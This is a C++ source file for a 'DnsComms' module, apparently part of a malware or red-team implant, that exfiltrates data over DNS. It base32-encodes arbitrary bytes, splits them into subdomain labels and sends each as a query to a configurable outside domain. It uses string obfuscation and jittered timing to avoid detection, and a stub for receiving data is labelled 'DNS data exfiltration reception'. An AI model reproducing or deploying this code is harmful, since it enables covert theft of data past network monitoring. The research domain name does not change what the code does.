#include "communication/DnsComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"   
#include "utils/StringUtils.h"
#include "utils/TimeUtils.h"
#include <vector>
#include <sstream>
#include <cstdint>
#include <string>

// Obfuscated strings
static const auto OBF_DNS_COMMS = OBFUSCATE("DnsComms");

DnsComms::DnsComms(Configuration* config)
    : m_config(config), m_dnsServer("8.8.8.8") {}

DnsComms::~DnsComms() {
    Cleanup();
}

bool DnsComms::Initialize() {
    // Parse DNS server from configuration if available
    std::string server = m_config->GetValue("dns_server", "8.8.8.8");
    m_dnsServer = server;
    
    LOG_INFO("DNS communication initialized with server: " + server);
    return true;
}

bool DnsComms::SendData(const std::vector<uint8_t>& data) {
    // Encode data as base32 for DNS compatibility
    std::string encodedData = utils::StringUtils::Base32Encode(data);
    
    // Split into chunks for DNS labels (max 63 bytes per label)
    std::vector<std::string> chunks;
    for (size_t i = 0; i < encodedData.length(); i += 50) {
        chunks.push_back(encodedData.substr(i, 50));
    }

#if PLATFORM_WINDOWS
    return SendDataWindows(chunks);
#elif PLATFORM_LINUX
    return SendDataLinux(chunks);
#endif
}

bool DnsComms::SendDataWindows(const std::vector<std::string>& chunks) const {
#if PLATFORM_WINDOWS
    bool overallSuccess = true;
    
    for (const auto& chunk : chunks) {
        std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
        
        DNS_STATUS status = DnsQuery_A(
            query.c_str(),
            DNS_TYPE_A,
            DNS_QUERY_STANDARD,
            NULL,
            NULL,
            NULL
        );

        if (status != 0) {
            LOG_DEBUG("DNS query failed: " + std::to_string(status));
            overallSuccess = false;
        }

        utils::TimeUtils::JitterSleep(100, 0.3);
    }

    return overallSuccess;
#else
    return false;
#endif
}

bool DnsComms::SendDataLinux(const std::vector<std::string>& chunks) const {
#if PLATFORM_LINUX
    bool overallSuccess = true;
    
    for (const auto& chunk : chunks) {
        std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
        
        // Use Linux DNS resolution (simplified)
        struct hostent* host = gethostbyname(query.c_str());
        if (!host) {
            LOG_DEBUG("DNS query failed for: " + query);
            overallSuccess = false;
        }

        utils::TimeUtils::JitterSleep(100, 0.3);
    }

    return overallSuccess;
#else
    return false;
#endif
}

void DnsComms::Cleanup() {
    LOG_DEBUG("DNS communication cleaned up");
}

bool DnsComms::TestConnection() const {
#if PLATFORM_WINDOWS
    return TestConnectionWindows();
#elif PLATFORM_LINUX
    return TestConnectionLinux();
#endif
}

bool DnsComms::TestConnectionWindows() const {
#if PLATFORM_WINDOWS
    PDNS_RECORD dnsRecord;
    DNS_STATUS status = DnsQuery_A(
        "google.com",
        DNS_TYPE_A, 
        DNS_QUERY_STANDARD,
        NULL,
        &dnsRecord,
        NULL
    );

    if (status == 0) {
        DnsRecordListFree(dnsRecord, DnsFreeRecordList);
        return true;
    }
    
    return false;
#else
    return false;
#endif
}

bool DnsComms::TestConnectionLinux() const {
#if PLATFORM_LINUX
    struct hostent* host = gethostbyname("google.com");
    return host != nullptr;
#else
    return false;
#endif
}

std::vector<uint8_t> DnsComms::ReceiveData() {
    // Implement DNS data exfiltration reception
    // This would typically involve running a DNS server
    return std::vector<uint8_t>();
}